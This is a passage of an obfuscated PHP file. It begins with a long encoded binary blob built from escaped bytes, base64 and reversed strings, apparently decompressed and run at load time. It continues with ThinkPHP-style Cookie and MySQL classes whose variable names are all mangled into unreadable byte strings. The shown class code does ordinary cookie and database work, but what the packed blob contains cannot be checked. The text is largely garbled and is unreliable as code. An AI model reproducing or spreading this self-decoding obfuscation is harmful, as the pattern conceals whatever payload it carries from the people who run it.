x2b\x36\x35\xd\xa8\x52\x29\x49\x67\xc9\xc8\x78\xab\x24\x4a\x5\xfe\x52\x89\x55".base64_decode('WLFQWT5gCUgnIrw8F6euobnmzLmX2ZfOkcudxqPFq0ye0jB1RgMz1zqR6USUikz/')."\x1a\x7d\x32\xa7\xf2\xc7\x5\xfb\x18\x1d\x10\xf\x4f\xb0\xbe\xe1\x9\x97\xbc\xf0\xbb\xc0\x62\x18\xf9\xa\x67\x4\xc4\x95\x4e\xb4\xd6\xf5\xa4\x9\x74\x94\xca\xf0\xd2\x6b\x1\xe4\xc0\x9b\xae\x24".base64_decode('rCmk8tcVKlDSDLNaNAqw7UoK2XxC+tmHxdNrYon05gZET3qxqjlg+ABqqCnYLLLl')."\112\247\313\351\154\251\60\320\50\105\52\216\151\52\171\255\60\12\322\301\4\273\141\202\75\23\127\324\70\41\160\122\237\215\2\100\257\271\57\135\274\217\10\317\207\324\23\17"."\304\320\343\375\0\176\12\45\200\67\251\4\263\263\244\207\173\300\120\344\112\374\11\213\42\371\206\326\166\104\73\133\43\61\111\271\111\2\250\115\315\61\65\324\321\121\61\102"."\256\43\210\65\3\2\313\141\70\360\33\130\100\115\215\174\277\222\306\266\30\215\125\30\132\245\330\126\232\171\27\256\12\2\115\45\11\204\154\65\313\200\54\325\70\213\322\207"."\120\306\117\276\150\164\365\354\131\101\143\66\37\170\341\3\311\62\205\251\111\40\170\74\226\264\202\130\175\250\160\42\236\151\131\233\201\100\133\204\307\43\105\231\245\51\164\114"."\x1b\xab\xb1\x6e\x47\x5f\xb5\x92\x45\x7b\x33\xd7\x9d\x9c\xed\xcd\x1c\x63\x57\x4a\xb3\x82\x9a\x1c\x89\x57\x59\xc2\x64\xac\x30\x17\xb0\x86\xf8\x21\x7e\xc5\xdb\x89\x90\xe4\x8b\x9c\x3c\x49\xd1\xa4"."\25\26\226\147\301\205\7\322\162\24\235\111\142\14\123\236\76\110\116\11\202\102\226\164\137\327\360\33\216\12\110\21\20\217\107\151\351\1\214\135\142\53\200\72\41\242\3\213"."\53\64\302\365\306\202\43\251\157\224\260\141\30\71\204\267\304\103\60\53\126\320\202\360\356\277\152\125\71\14\64\100\275\121\241\242\341\5\141\314\361\302\260\70\56\140\150\117"."\x73\x57\x43\xb1\x56\x4e\x24\x20\x2c\xd\xfd\x15\x79\xa2\xb1\x56\x11\xa0\xe2\x89\x2b\xb2\x8b\x29\x5b\x93\x50\x77\x57\x75\xa0\x6e\xd5\xaa\xa0\xc1\xf4\xa4\x98\x4e\x7\xcb\x1b\xe0\xa9\x69\xb8\x3b".base64_decode('4E6PegJDzxMCwJuS8pLzYfHtH6wTxmxcH0rBSlKNjbO7+J1PD4tjDKExaTqb/rGs').strrev('“½;WÈ7£9÷!íŞÈ9EŠ‡~ˆÈœOâÏı¹	J9'."\0".'“Òœ‘ËËÅ6ˆµ?')."\244\205\15\30\113\102\150\215\7\216\225\231\74\21\330\124\207\200\207\20\141\104\34\330\162\57\34\225\305\201\374\143\226\235\266\214\242\343\242\123\364\125\303\52\362\4\315\162"."\x6d\x48\xa3\x49\xaa\x14\x90\xd5\x1b\xab\x88\xb\xfe\x2a\x44\x97\x68\xc\x10\x4\xd1\x94\x59\x98\x0\x29\x96\x9e\x6b\xac\x22\xcd\xb5\xb3\xba\x8e\xf2\x13\x12\x53\xa9\x12\x94\xb1\x4a\x61\xd4\x31"."\xaf\xf1\x11\xb3\x1c\x13\x6d\x82\xdc\x6\x8\x1e\x84\xea\x4c\x80\x99\x44\x28\x6\x77\x3e\xc0\x5e\x1d\x7f\x2a\xfd\x3d\xe1\x78\x86\x28\xe4\x75\xb2\x9c\x6e\x51\x5d\x70\x42\x75\xc8\x2d\x60\x9f\x38"."\xef\x82\xf7\xa9\x3a\x12\xf1\x54\xbc\x89\x3d\xe7\x53\xe9\x60\xec\x24\xc6\xcb\xda\xd4\x7c\x4e\xc8\x3c\xcc\xa2\x87\xab\x4c\xb0\x14\x9c\x3b\x8\x2\x4\xa6\xdf\x2a\x15\xa\x5c\xfb\xc\xb3\x8b\x7c".base64_decode('C8PaLOr8ZDzGnj9JcezBtlUBpUtjl1Sgtkpv3ZLZkiO2S+zTP4Vth20ASx4Msf9E')."\124\120\27\75\307\154\254\147\206\33\114\251\115\130\234\101\312\12\145\320\63\342\24\127\32\323\13\256\343\20\132\167\316\144\116\35\47\327\327\327\373\353\47\241\277\374\266\30".strrev('SzÓpRß¶WVbP£@~\\ÎºÃ‚ñDî)0¼\' /ä'."\r".'õõ$²úú†·Ø')."\xc1\xda\x8f\xe6\x83\xf8\x5a\x64\x74\x64\xa6\x24\x17\xce\x54\xc8\x6d\x24\x84\x74\xef\x20\xf0\x6b\x5e\x98\x61\xd9\x59\x37\xfb\x46\x8c\xe\x9a\x6d\x32\x28\xd0\x5e\x6e\x7c\x88\x92\x9\x3c\x9a\x49"."\x6d\x3d\x1b\x79\xa3\xc2\x85\x4c\x97\x5c\x59\x80\xd\x2e\x5\xa\x7\xd3\x7e\x16\xe1\x97\x1f\x84\x80\x4c\x74\x87\x10\x77\x1c\xae\xa6\xa1\x3c\x6e\x27\x8e\x18\x82\x76\xea\x34\xef\x27\x6\x48\xc7"."\47\230\153\223\34\123\342\240\174\225\101\242\271\205\35\11\345\270\63\1\34\214\361\222\350\273\43\324\154\20\306\260\2\272\146\315\141\125\154\306\70\70\237\207\310\220\142\371"."\x89\xa1\x61\x46\xb2\xc7\xc4\xe3\xca\xc8\x32\x43\x3b\xa6\xa4\x0\x3a\xf\xc4\xbe\x7e\xc0\xc8\xb9\xac\x8a\x55\xa9\x6c\x79\x34\x67\xe2\x84\xf2\x28\xa1\x45\x1b\xe2\xf\xac\x50\xcd\x43\x56\xbd\x2"."\253\13\30\5\274\127\220\267\361\250\262\150\303\376\145\363\347\170\347\216\114\203\145\12\233\340\62\175\37\26\222\46\203\235\230\47\277\101\45\207\101\302\14\100\225\130\232\270"."\xdb\x46\xa9\x0\x6f\x94\x27\x4f\x88\x1e\xb4\x97\x65\x0\x78\x79\x6a\x72\x39\x51\x21\x35\x86\x7b\x52\x13\x87\x8d\x4d\xdc\xeb\xac\xec\xc5\x91\x6a\xf\x48\x3a\x26\x36\x78\xd6\x17\xea\x2\xac\x8c"."\41\111\172\12\24\55\263\37\115\263\55\17\32\202\167\124\6\363\344\345\51\53\44\342\255\227\323\311\100\174\363\301\136\250\4\214\25\166\311\232\170\40\127\112\52\356\44\44"."\240\173\301\112\21\115\374\35\44\31\210\245\61\131\101\204\250\340\272\313\300\142\236\33\302\133\366\65\110\307\304\163\7\136\63\225\25\20\151\62\101\164\360\321\211\174\300\253"."\xba\xd0\x84\xe1\x2a\xd3\x47\xc1\x23\x24\xee\x86\xdd\x70\xa\xa3\x2\xb4\xeb\x3a\x29\x45\x68\x59\x4e\x67\x8f\xab\x2\xb5\x23\x8b\xa\x17\x40\xf4\x76\x3c\x83\x2a\x16\x2\x2c\xdd\xc6\x46\x39\x9b".base64_decode('O+7vP17HPi5mqfCw8vM/+WAcD6kqn23gFd3G3/SsgIhuZCvDKsIC4AIaOLWTQkiY')."\203\214\132\206\265\167\260\244\63\36\125\42\215\212\43\10\43\220\261\124\326\62\35\56\277\340\370\120\106\42\367\121\231\103\111\321\54\376\331\242\36\327\275\232\344\74\232\47"."\x45\x5b\x19\xab\x5d\x63\xdb\x1b\x51\x12\x23\xce\xb7\x25\x91\xca\x13\xf4\x2a\x92\x91\xad\xc8\x61\xbb\x9\xf3\xc6\x5d\xe0\x2f\x6b\xe1\xe9\x4c\x4a\x7a\x3c\x15\x6a\x80\x4c\x3c\xb\xec\x91\x96\x9e"."\66\55\42\133\113\116\24\12\116\102\357\227\203\121\223\237\51\340\173\33\275\102\21\330\157\215\204\366\30\13\220\264\133\222\275\340\110\116\273\121\110\362\316\56\361\72\376\111"."\xa\x67\x92\x54\x5a\x32\xd\x4c\x94\x22\x48\xfa\x4a\xfc\x92\xe7\x94\x4b\xb2\x68\x20\xc2\x7c\xb2\xd4\xcb\x2f\x1b\x3c\x5c\xc\x33\x92\x50\x64\x26\x81\x59\x3d\xe0\x2\x88\x43\x12\xdc\x3\x5b\x8e"."\x43\xc5\x62\xc7\xba\xa2\x67\x72\x16\x52\x67\x59\x16\x1a\x87\xf7\x69\xe1\xd6\x43\x8e\xb1\xb1\xdb\xf5\x4e\x36\x6d\x95\x62\x2a\x54\x45\xa2\xa4\x11\x4d\x73\xe7\x46\x30\x3a\x62\x90\x20\x62\x54\x67"."\xba\x82\xfe\x49\x93\xfd\x53\xe0\x2c\x5b\xb6\xa0\x60\x8c\x32\xd0\x31\xb4\x16\x24\x34\xc0\x32\x5\xa3\x8d\xa0\xf8\x7\xe9\x44\x1a\x53\xba\xb2\x21\xae\x3e\x84\x3\x2\xe2\xd5\x84\xcf\x27\x71\x7f"."\302\103\226\264\227\351\134\51\220\370\1\221\311\212\270\151\247\272\202\70\101\147\245\170\72\102\70\272\331\245\112\351\111\200\126\206\73\36\74\261\213\306\120\127\44\246\113\37"."\307\123\10\170\371\227\75\314\223\134\242\37\102\53\25\201\114\352\357\135\32\30\241\61\100\75\244\60\165\132\116\227\4\70\145\162\140\271\326\101\200\253\23\203\155\51\74\223".base64_decode('WVOLbUtdJzjto9wCEOsE4U2C63TacoDFcuS0XQGqA+XKzUE81TBzzMZPGjraOoIc')."\64\217\57\117\52\235\12\307\114\115\114\321\110\274\355\76\234\67\322\112\64\336\32\151\12\105\233\43\311\5\112\277\356\50\102\75\202\274\322\340\136\312\344\140\215\16\74\303"."\xea\x5e\xfe\x60\x0\xfe\xf4\xf7\x22\x8e\xd5\x9f\xe1\x8c\xbb\x2d\x58\x74\x49\x13\x4c\x7a\x99\xc9\x5d\x2c\xc5\x3f\xdd\x2a\x2b\xb1\x80\xad\x3f\x72\x65\x79\xf0\x71\x61\x85\xd4\x39\x71\x7a\x26\x25"."\56\132\172\171\372\121\235\74\316\56\132\54\145\50\125\150\15\244\257\134\3\171\325\101\116\215\66\142\275\60\136\343\215\302\220\141\33\142\341\263\34\243\162\351\241\346\366\110"."\x4c\xd\x45\xa3\x48\xbc\x97\x35\xe6\xc4\x41\xa9\xc5\xdf\xd0\xc8\xc8\x4f\x6e\x48\x33\x23\x26\x81\xd6\x5e\xee\x2f\xc\xbc\x2d\xc9\x9e\xcf\x3d\x92\x3a\x9d\x3e\xd9\x6f\x5c\x91\x5d\x1\xc0\x1b\x83"."\xdc\x3\x3f\xd\x4a\xef\xe7\x14\x2d\xcd\xb0\x75\x9\x40\x9f\x75\xa9\x3\x63\xb\x2d\x97\x73\xbd\x9c\x97\xeb\x93\x82\x25\xf7\xce\x5a\xb1\x2a\x95\x56\xc0\x60\x92\x6b\xba\x4a\x9\x12\xf8\x49\xf4"."\xff\x75\x53\x8d\x8c\x70\x11\x65\x64\x98\x26\x2\xb7\x8d\xa3\xce\xf9\x9b\xe4\x57\x16\x59\x9d\x65\x6f\x4\x7d\xe3\x6b\x43\x3e\x71\x69\xa2\x12\x27\x37\xec\xd1\x33\x93\xb0\xe3\xc0\x2b\x52\x58\x24"."\xae\x52\xe7\x39\xa2\xa\x24\x28\x5a\xa3\x45\xf9\xd6\x2a\x98\x9\xf2\x21\xa6\x1f\xd8\x13\x5e\x98\x1d\x59\xe3\x80\x60\x8c\x71\x72\x28\xd\x57\x47\xc5\x25\x24\x5\xe2\x73\x1d\xc6\x42\x33\xd\x48"."\104\47\140\234\135\267\266\236\167\223\274\12\242\256\207\312\313\352\40\56\372\151\134\27\356\16\112\331\43\72\207\102\374\301\15\221\325\33\123\241\1\50\132\21\307\46\74\201"."\322\250\324\323\47\274\370\23\12\312\54\146\351\53\52\40\276\253\302\371\242\343\22\45\333\144\315\160\151\156\50\200\160\72\102\124\300\372\64\146\176\264\14\340\72\53\211\262"."\x76\x71\x85\x3c\xfc\x80\x44\xa1\xcf\x94\xc7\x8f\x10\x64\xac\xe6\x4f\x1f\xe2\xa3\x32\xab\xf\xf1\xfa\xba\x53\xfe\xe\xf\xcd\xfe\xff\x25\x23\x8d\x4c\x4a\x6a\x8a\xee\x42\xca\x1b\x64\x7b\xb7\x3a"."\xc1\x76\xe1\x27\x86\xb2\xe6\xb0\xfb\x35\x3e\xc\xf1\x3e\x2a\xe4\x7a\x4e\x48\x5a\x34\xc4\x20\x55\x7e\x0\xc9\x9d\xc9\x57\xf6\x90\x87\x42\x9e\x59\x55\x10\xaa\xc3\x2c\x62\x2f\x46\xb6\xbc\x4c\xa5"."\252\47\320\237\156\370\145\333\231\267\21\224\120\101\225\265\34\251\232\262\106\56\143\161\5\21\1\150\327\205\240\112\162\141\35\11\215\75\47\113\336\46\153\146\64\31\336\16"."\251\364\354\24\366\103\347\176\14\105\274\61\43\366\116\367\53\34\374\232\323\26\213\301\166\134\257\274\244\314\224\326\357\243\34\31\246\152\42\64\157\124\376\226\225\104\111\57".strrev('•ÒW\\SI£.Uz —-^Ìç÷s”ı8Ò´‰8ûÎ¤£^GÆ[¸öRÙïŸ HÍ¤P')."\214\202\202\132\261\50\256\136\344\55\23\375\357\62\234\203\270\316\124\233\112\314\277\125\172\127\233\24\70\47\135\332\120\40\134\340\224\12\21\172\320\355\202\132\222\234\47\53".base64_decode('+NKrKmGhBclROzvo3RQMmFwkuy/kp64t0rPjwfL7RawxBhRFVqiEq96ALIhBAmWW')."\42\120\303\265\220\61\52\41\156\330\107\76\10\245\220\31\367\257\201\162\14\166\77\174\103\121\235\374\64\353\175\134\212\301\141\261\233\313\76\53\204\216\201\367\355\66\126\15".base64_decode('f3rOR3smnhylD835+KNyPuru0AdPyfmEpd3XvZ0jXhN2P0GM28w1EMvECa8kwYfK')."\223\41\341\35\270\224\131\176\346\50\156\125\13\245\274\270\247\106\1\267\144\125\326\141\251\207\45\53\347\43\167\312\76\346\311\315\63\34\242\127\362\314\124\30\303\157\56\203"."\52\242\22\161\51\343\246\127\15\263\172\55\166\57\347\115\146\270\260\116\265\164\141\161\102\235\157\226\221\366\45\371\314\344\51\123\147\310\307\22\142\176\304\355\325\24\372\3"."\xb7\x6d\xc0\x67\x88\x19\x57\xdc\xf8\xa4\x30\x8f\x9f\xf2\xba\x25\x91\x6e\x1d\xe1\xf2\x37\x1f\x3d\xb4\xfb\x7f\x87\xf9\x82\xef\xa7\x49\x25\x8d\xdd\xf2\xb7\x73\xcb\x46\x80\x20\xa1\xa4\xcb\x22\x6d"."\x65\x1e\x65\x5\x13\xeb\x10\xd8\x62\xf9\xd0\xcd\x4b\xbc\xf4\xe8\xae\x8b\x6e\xfc\x15\xfa\x21\xed\x58\x62\x25\xd0\x87\xf8\xcc\x1c\x96\x8e\xf3\xf8\xd4\xd7\xb1\x34\xb7\x28\x58\x49\xe2\x21\x23\xc1"."\304\53\203\274\207\255\173\333\116\6\6\316\101\104\264\44\22\311\45\72\246\367\20\7\147\307\73\32\71\103\214\27\162\260\341\142\13\142\261\246\44\222\362\277\230\100\46\335".strrev('õ}İ8‹|\'ºJBüs_œ’ã/”İ¦¿ûî”Z£.pyèTª¨HAP').strrev('AH·m•Ñù*Õ®¡]‚“¤Òü“ˆÎ¼8ªfnpËbJcáF=é3™Ê‰xÊ|z2‰²')."\xf2\x32\x28\x2f\x5a\x7a\x78\x4f\x1c\xe1\x90\x33\x1f\xe8\x4\xac\x61\xe2\x3a\x93\xd8\xec\x85\x5a\xb9\x1d\x9f\x26\xa9\x17\xb9\xcf\x95\xf0\xe8\x4a\x6f\xad\x9a\xf2\xb7\x18\x75\x4c\xcf\xe3\xcc\x7b"."\x28\xaa\xdd\x25\x17\xa2\x70\xb3\xe7\x1d\x5e\x42\x95\xbc\x8f\xf3\xb2\x21\x22\xa4\x40\x50\x39\xc9\x3c\xd4\x25\x84\xf0\xc7\xc9\x5c\x42\x89\xed\x7d\x7f\x10\xb1\x66\xb2\x87\x61\x14\xe4\x8b\x0\xb6".base64_decode('UyCHRKeb1ibtlmJjFF+xUl4EpMNYIv/wSJcVLfaV5Fn5zDbX9rxGSn2z0m/Gpv//').strrev('–ÌY2®+˜RÕÃø‹'."\0".'ıÍ7¸~¶G¦—ù&6–`Vß5ë¹±ÙëS{;Öÿïp~')."\306\256\171\264\134\116\332\132\53\213\27\145\317\240\42\344\33\340\157\150\126\12\170\15\306\274\117\242\166\261\307\305\311\153\247\75\225\22\12\312\303\245\230\12\170\114\101\214".base64_decode('eS2U33Ti+Yq6vTNLTEZZMlEr4kWY67Eg+0pjgQ1zoozMypai8SIT7WqBsvfMZeSI').base64_decode('2J4DVZIpkQtURr9SrllwAeUBhlnDxrXup+ghR7vnSUeayJZH03W4Xn7xXZ6br3w5').base64_decode('C9YQdp838We8673vek/yl1dGFfTxkUcCHzKwYyNy/0LuRyvkoZiaFGnGWSuVVyx/')."\112\123\234\241\341\57\271\277\154\345\167\130\46\141\350\334\120\176\360\42\51\144\112\17\115\117\10\224\355\57\214\332\271\206\34\111\131\342\202\317\60\211\213\166\226\265\263\275".strrev('¥¯w‡Ö\';†ü¶r\'\\€4ö’_æf×y>³‘Rˆsp”×Œâ½/sÅ¡!"Æ'."\0".'šØ†')."\331\225\222\245\115\313\226\222\161\170\245\264\30\303\344\23\7\71\16\277\270\353\270\346\102\170\333\367\172\331\47\162\70\25\255\135\22\66\334\301\312\40\351\212\22\61\333\31"."\367\263\35\44\222\200\231\107\114\50\101\272\144\163\337\161\162\337\337\145\224\262\144\104\245\150\222\213\71\132\103\277\330\104\56\42\174\63\220\150\172\175\20\222\36\163\366\346"."\162\77\2\56\335\210\246\11\346\205\313\57\275\304\135\234\304\147\260\154\130\22\22\133\200\7\136\351\31\353\76\155\110\60\111\202\27\317\144\370\23\363\256\244\31\46\215\160"."\50\202\210\327\350\61\223\45\131\341\12\5\156\175\330\373\256\157\100\266\334\165\45\54\207\12\53\135\51\277\270\376\20\335\304\260\112\335\47\13\315\235\135\266\2\346\110\45".base64_decode('QPThBa4/JMk92ChBKBbRrnAhXlTptjnmyficoTTEBMTvgnokOXwkwjgGTxScIEjF').base64_decode('VzxokFBAz0Wl4uRL0HEzJCtXIrDSPcSSsbaIYFud6Rp8iUTyjkHKhBzpao53aokQ')."\42\320\227\2\363\344\0\226\306\205\334\121\64\275\356\151\275\234\301\333\63\232\303\36\66\234\164\126\222\214\312\43\313\341\126\331\240\102\105\225\333\353\155\25\33\123\257\274".base64_decode('KAopa4+kSZEyK+ShLaqYjUbhnIJddeUdZwhwXhqF85ZFs8zS8YqUz9FK9jjdKx88')."\70\163\310\124\350\260\107\62\247\111\307\33\317\212\211\313\253\3\214\363\246\46\207\24\225\133\41\316\26\74\67\332\225\132\121\61\361\270\255\20\251\75\273\100\45\132\313\142"."\x2a\x50\x57\xa1\xda\x50\x4e\xc7\x45\x5c\x5\x45\xb\x5a\x26\xde\xa3\x65\xe7\x4d\x15\xa2\x65\xad\x8d\xca\x7a\x1d\x89\x8a\x4b\xdf\x76\x2b\x5c\x78\xe0\xf2\xc0\x80\x9f\x4e\xe0\xae\x0\xdb\x90\xa4".base64_decode('mDMGhA4aU5me4KLvpcJAweR7Rkboy2Hl3pDlHciy0tx4WihJrk8ranD7sFxfLkHn')."\64\166\146\57\251\276\123\221\307\164\214\264\356\366\257\52\373\160\242\361\254\222\234\164\66\350\71\226\23\247\14\56\205\200\12\7\127\4\4\174\235\70\376\246\345\111\34\213"."\300\11\227\311\1\345\23\340\112\200\336\46\66\341\133\153\176\217\104\174\203\322\175\225\106\47\115\313\361\341\270\224\131\44\277\363\114\307\21\267\353\124\254\47\314\40\336\34"."\x7d\x92\xf2\x8\xfa\x12\x97\x46\xb8\x51\xe4\x36\x82\xa0\x2d\x21\x2f\xe4\x13\xee\x35\xb1\xbc\x9c\xd4\x69\x2c\x21\x4a\xae\x0\xbe\xe5\xe0\x1\x79\xef\x83\xfb\xcd\x96\x92\xe7\x6\x56\x0\x90\x70".strrev('Ä©>•ß±y`XğŠ3'."\r".'~ıAÛŒ…ıY?@ø&CHL_´Y¬Ø‹Ï0kÚ')."\x55\x3a\xbf\xae\x4\x38\x45\x15\x45\x50\x77\xdd\xe4\xac\xb\x6c\x43\x92\xa9\x64\x59\x54\x47\x28\x99\x5c\x14\x4f\x34\x53\xef\xde\x65\xd1\x24\x97\xa4\x4e\x54\x16\xd5\xd1\x16\x8f\x8d\x17\x17\x6e"."\xf\x45\xa2\x65\x71\x58\xf3\x28\xa6\xa\x37\x5b\x34\x2a\xd2\x41\x5a\x49\xae\xef\xc6\x6b\x45\xa4\x69\x81\x68\x9\xb9\x28\x16\x87\xf3\xc5\xac\xc9\xce\xdc\xd9\xe5\x45\x52\xcb\x31\x29\x5d\xb2\x7c"."\xd4\xf3\xc2\xdf\x9a\xc8\x53\x30\xd2\x3\xe2\x70\x4f\x93\x98\x77\x9b\xb9\x22\xe4\x1f\xee\xa7\x72\x3c\xa\x7e\xc\x49\xa1\x20\xac\x35\x14\x83\xb2\x13\x45\x80\x62\x6f\xe7\x7c\xad\x73\x46\x5a\xdc"."\x7c\x7\x5c\x37\xe4\x12\x9c\xac\x7\x42\x60\x24\x9c\x93\x37\x5a\x2\xa8\xab\x38\x40\xf2\xc1\x6e\xf9\x45\x3\x89\x15\x3\x80\x1b\x36\xdf\x4\x95\xb3\xe5\x66\xaf\x74\x91\x40\xc5\x18\xb0\x3e\x84".base64_decode('IZU0w+i3K9rR+iteFNPTPLzixTnb/wGD8mFwHaoAAA==').strrev('').strrev('').""."", 10, -8))); goto e“¹Ë‰ËÊ¡; C¢”ÂèªØ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Šñ“Ş­ = '', $Ñù úë  = 0) { if (is_string($Šñ“Ş­) && $Šñ“Ş­ != $_SERVER[ÏéâËõ‘][12]) { $this->prefix = $Šñ“Ş­; } if (is_numeric($Ñù úë ) && $Ñù úë  > 0) { $this->expire = $Ñù úë ; } } public static function getInstance() { static $Ò™¬‰¸Ğ; if ($Ò™¬‰¸Ğ === null) { $Ò™¬‰¸Ğ = new self(); } return $Ò™¬‰¸Ğ; } private static $cookieDisable = false; public static function disable($éÏ´) { self::$cookieDisable = $éÏ´; } private static $sameCookieSet = array(); public static function set($äº×‹ö˜, $„ÊìäŞš, $¢˜šÃ©¦ = 0, $´ğóÇ°ã = false, $ñÄ©ó•Ë = false) { $ãÀ÷Æó =& $_SERVER[ÏéâËõ‘]; if (self::$cookieDisable) { return; } if (!$¢˜šÃ©¦) { $¢˜šÃ©¦ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$äº×‹ö˜]) && self::$sameCookieSet[$äº×‹ö˜] == $„ÊìäŞš . $¢˜šÃ©¦) { return; } self::$sameCookieSet[$äº×‹ö˜] = $„ÊìäŞš . $¢˜šÃ©¦; if (!$ñÄ©ó•Ë) { $ñÄ©ó•Ë = str_replace(HOST, $ãÀ÷Æó[12], APP_HOST); $ñÄ©ó•Ë = _get($GLOBALS, $ãÀ÷Æó[887], $ñÄ©ó•Ë); } $‹©ªŠˆ = $ãÀ÷Æó[12]; setcookie($äº×‹ö˜, $„ÊìäŞš, time() + $¢˜šÃ©¦, $ãÀ÷Æó[8] . trim($ñÄ©ó•Ë, $ãÀ÷Æó[8]) . $‹©ªŠˆ, !1, !1, $´ğóÇ°ã); } public static function setSafe($¬Î‡—, $¯¹­†”, $šÒ‡Îß¬ = 0) { self::set($¬Î‡—, $¯¹­†”, $šÒ‡Îß¬, !0); } public static function get($Å¸÷™Î) { static $Úªû¥È = false; if (!$Úªû¥È) { self::initHeaderCookie(); $Úªû¥È = !0; } return isset($_COOKIE[$Å¸÷™Î]) ? $_COOKIE[$Å¸÷™Î] : !1; } private static function initHeaderCookie() { $ƒÍ„ù›Á =& $_SERVER[ÏéâËõ‘]; if (!isset($_SERVER[$ƒÍ„ù›Á[888]]) || !$_SERVER[$ƒÍ„ù›Á[888]]) { return; } $Ãİáª¾ = explode($ƒÍ„ù›Á[71], $_SERVER[$ƒÍ„ù›Á[888]]); foreach ($Ãİáª¾ as $ÏÒ‚¡‚) { $ÏÒ‚¡‚ = explode($ƒÍ„ù›Á[889], $ÏÒ‚¡‚); if (count($ÏÒ‚¡‚) != 2 || !isset($ÏÒ‚¡‚[1])) { continue; } $_COOKIE[trim($ÏÒ‚¡‚[0])] = trim($ÏÒ‚¡‚[1]); } } public static function remove($è£š³‹Æ, $¥ä†ÃÄ = false) { unset($_COOKIE[$è£š³‹Æ]); self::set($è£š³‹Æ, $_SERVER[ÏéâËõ‘][12], 1, $¥ä†ÃÄ); } } class DbMysql extends Db { public function __construct($ëıĞ³’¶ = '') { $¤¬É·½ =& $_SERVER[ÏéâËõ‘]; if (!extension_loaded($¤¬É·½[806])) { think_exception(think_lang($¤¬É·½[14]) . $¤¬É·½[890]); } if (!empty($ëıĞ³’¶)) { $this->config = $ëıĞ³’¶; if (empty($this->config[$¤¬É·½[17]])) { $this->config[$¤¬É·½[17]] = $¤¬É·½[12]; } } } public function connect($œÍ£éÃË = '', $¬‹üÈ¦ = 0, $ÃÈœ‰¦ç = false) { $Ê†üö×é =& $_SERVER[ÏéâËõ‘]; if (!isset($this->linkID[$¬‹üÈ¦])) { if (empty($œÍ£éÃË)) { $œÍ£éÃË = $this->config; } $‰À£í× = $œÍ£éÃË[$Ê†üö×é[891]] . ($œÍ£éÃË[$Ê†üö×é[892]] ? "\x3a{$œÍ£éÃË[$Ê†üö×é[892]]}" : $Ê†üö×é[12]); $é‚ò¿‡¯ = !empty($œÍ£éÃË[$Ê†üö×é[17]][$Ê†üö×é[18]]) ? $œÍ£éÃË[$Ê†üö×é[17]][$Ê†üö×é[18]] : $this->pconnect; if ($é‚ò¿‡¯) { $this->linkID[$¬‹üÈ¦] = mysql_pconnect($‰À£í×, $œÍ£éÃË[$Ê†üö×é[893]], $œÍ£éÃË[$Ê†üö×é[894]], 131072); } else { $this->linkID[$¬‹üÈ¦] = mysql_connect($‰À£í×, $œÍ£éÃË[$Ê†üö×é[893]], $œÍ£éÃË[$Ê†üö×é[894]], !0, 131072); } if (!$this->linkID[$¬‹üÈ¦] || !empty($œÍ£éÃË[$Ê†üö×é[21]]) && !mysql_select_db($œÍ£éÃË[$Ê†üö×é[21]], $this->linkID[$¬‹üÈ¦])) { think_exception(mysql_error()); } $¡‰µĞÉø = mysql_get_server_info($this->linkID[$¬‹üÈ¦]); mysql_query($Ê†üö×é[895] . think_config($Ê†üö×é[896]) . $Ê†üö×é[58], $this->linkID[$¬‹üÈ¦]); if ($¡‰µĞÉø > $Ê†üö×é[897]) { mysql_query($Ê†üö×é[898], $this->linkID[$¬‹üÈ¦]); } $this->connected = !0; if (1 != think_config($Ê†üö×é[22])) { unset($this->config); } } return $this->linkID[$¬‹üÈ¦]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Úƒğíµ˜) { $µçÃâñì =& $_SERVER[ÏéâËõ‘]; if (0 === stripos($Úƒğíµ˜, $µçÃâñì[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Úƒğíµ˜; if ($this->queryID) { $this->free(); } think_action_status($µçÃâñì[23], 1); think_status($µçÃâñì[24]); $this->queryID = mysql_query($Úƒğíµ˜, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($šî¸ÔïÇ) { $Ù×‚ÅØ =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $šî¸ÔïÇ; if ($this->queryID) { $this->free(); } think_action_status($Ù×‚ÅØ[25], 1); think_status($Ù×‚ÅØ[24]); $ÔåôîŞº = mysql_query($šî¸ÔïÇ, $this->_linkID); $this->debug(); if (!1 === $ÔåôîŞº) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÏéâËõ‘][899], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­÷Ü®Û = mysql_query($_SERVER[ÏéâËõ‘][900], $this->_linkID); $this->transTimes = 0; if (!$­÷Ü®Û) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ã¸ƒ¯³ = mysql_query($_SERVER[ÏéâËõ‘][901], $this->_linkID); $this->transTimes = 0; if (!$Ã¸ƒ¯³) { $this->error(); return !1; } } return !0; } private function getAll() { $“™¸Û‚¯ = array(); if ($this->numRows > 0) { while ($Şñ³’øÚ = mysql_fetch_assoc($this->queryID)) { $“™¸Û‚¯[] = $Şñ³’øÚ; } mysql_data_seek($this->queryID, 0); } return $“™¸Û‚¯; } public function getFields($àá…’¢Â) { $æš«ï‡¦ =& $_SERVER[ÏéâËõ‘]; $æºæü© = $this->query($æš«ï‡¦[902] . $this->parseKey($àá…’¢Â)); $§ú—ë¥ê = array(); if ($æºæü©) { foreach ($æºæü© as $İí·¶Ëò => $ÔúÙè–ô) { $§ú—ë¥ê[$ÔúÙè–ô[$æš«ï‡¦[31]]] = array($æš«ï‡¦[32] => $ÔúÙè–ô[$æš«ï‡¦[31]], $æš«ï‡¦[33] => $ÔúÙè–ô[$æš«ï‡¦[34]], $æš«ï‡¦[35] => (bool) (strtoupper($ÔúÙè–ô[$æš«ï‡¦[36]]) === $æš«ï‡¦[903]), $æš«ï‡¦[37] => $ÔúÙè–ô[$æš«ï‡¦[38]], $æš«ï‡¦[39] => strtolower($ÔúÙè–ô[$æš«ï‡¦[40]]) == $æš«ï‡¦[41], $æš«ï‡¦[42] => 